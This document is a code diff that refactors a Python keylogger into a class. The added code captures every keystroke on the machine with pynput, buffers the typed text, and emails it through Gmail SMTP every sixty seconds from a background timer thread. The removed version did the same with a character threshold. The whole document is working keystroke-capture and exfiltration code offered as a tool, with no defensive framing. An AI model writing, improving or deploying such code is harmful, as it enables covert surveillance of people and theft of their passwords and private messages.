@@ -1,70 +1,76 @@
-import os
 import smtplib
+import datetime
 from pynput import mouse, keyboard
-
-smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
-smtpObj.ehlo()
-smtpObj.starttls()
-
-email = input('Enter your email: ')
-password = input('Enter your password: ')
-threshold = int(input('Enter threshold: '))
-
-try:
-    smtpObj.login(email, password)
-except smtplib.SMTPAuthenticationError:
-    print('enable less secure apps in your email.'.title())
+from threading import Timer
 
 
-def send_stoke_to_mail(msg):
-    try:
-        msg = 'Subject: Log Info\n' + msg
-        smtpObj.sendmail('logger@log.com', email, msg)
-    except Exception as e:
-        print(e)
+
+class Keylogger:
+    def __init__(self, interval=300, send_logs=False):
+        # Time interval for sending mails.
+        self.interval = interval
+        self.send_logs = send_logs
+        # Used to store keystrokes captured from the device.
+        self.logs = ''
 
 
-captured_strokes = ''
-special_keys = {
-    'Key.space': ' ',
-    'Key.tab': '    ',
-    'Key.enter': '\n'
-}
+    def handle_key_press(self, key):
+        try:
+            self.logs += key.char
+        except AttributeError:
+            if key == keyboard.Key.backspace:
+                self.logs = self.logs[:-1]
+            elif key == keyboard.Key.enter:
+                self.logs += '[ENTER]\n' 
+            elif key == keyboard.Key.space:
+                self.logs += ' '
+            else:
+                pass
 
 
-CTRL_STATE = False
-
-def on_press(key):
-    global CTRL_STATE, captured_strokes, threshold
-    string = ''
-    if key == keyboard.Key.ctrl_l:
-        CTRL_STATE = True
-    try:
-        string = key.char
-    except AttributeError:
-        key = str(key)
-        if CTRL_STATE and key == 'Key.backspace':
-            captured_strokes = ' '.join(captured_strokes.split(' ')[:-1])
-        elif key == 'Key.backspace':
-            captured_strokes = captured_strokes[:-1]
-        else:
-            string = special_keys.get(key, '')
-    finally:
-        captured_strokes += string
-        if len(captured_strokes) > threshold:
-            send_stoke_to_mail(captured_strokes)
-            captured_strokes = ''
+    def request_mail_credentials(self):
+        self.email = input('Enter Email: ')
+        self.password = input('Enter Password: ')
 
 
-def on_release(key):
-    global CTRL_STATE
-    if key == keyboard.Key.esc:
-        print(captured_strokes)
+    def send_mail(self):
+        # You can change your smtp server if you use a different mail
+        smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
+        smtpObj.ehlo()
+        smtpObj.starttls()
+        try:
+            smtpObj.login(self.email, self.password)
+        except smtplib.SMTPAuthenticationError as err:
+            print('An error occurred: ', err)
+
+        log_date = datetime.datetime.now()
+        msg = f'Subject: Log info\n {log_date}: {self.logs}'  
+        smtpObj.sendmail('KeyLogger', self.email, msg)
+        # End the smtp session
         smtpObj.quit()
-        return False
-    elif key == keyboard.Key.ctrl:
-        CTRL_STATE = False
 
 
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    def report(self):
+        if self.logs:
+            self.send_mail()
+        self.logs = ''
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+
+    def start(self):
+        if self.send_logs:
+            self.request_mail_credentials()
+        self.report()
+        with keyboard.Listener(on_release=self.handle_key_press) as listener:
+            listener.join()
+
+
+
+if __name__ == '__main__':
+    keylogger = Keylogger(60, True)
+    keylogger.start()
+
+
+
